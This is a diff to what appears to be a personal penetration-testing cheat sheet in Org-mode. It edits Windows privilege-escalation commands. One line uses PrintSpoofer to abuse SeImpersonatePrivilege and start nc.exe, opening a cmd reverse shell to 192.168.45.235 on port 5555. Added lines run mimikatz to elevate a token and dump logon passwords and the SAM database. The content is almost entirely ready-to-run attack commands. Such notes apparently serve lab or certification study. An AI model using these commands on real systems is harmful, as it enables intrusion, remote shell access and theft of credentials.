@@ -1022,7 +1022,7 @@ EXEC xp_cmdshell 'whoami';
    
    Exploit ~SeImpersonatePriv~
    #+begin_example
-./PrintSpoofer64.exe -c "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
+.\PrintSpoofer64.exe -c "C:\TEMP\nc.exe 192.168.45.235 5555 -e cmd"
 .\PrintSpoofer64.exe -i -c powershell.exe
    #+end_example
     
@@ -1037,7 +1037,9 @@ EXEC xp_cmdshell 'whoami';
    Dumping logon passwords with mimikatz
     
    #+begin_example
-./mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
+.\mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "log" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"
    #+end_example
 
    Dumping LSA with mimikatz
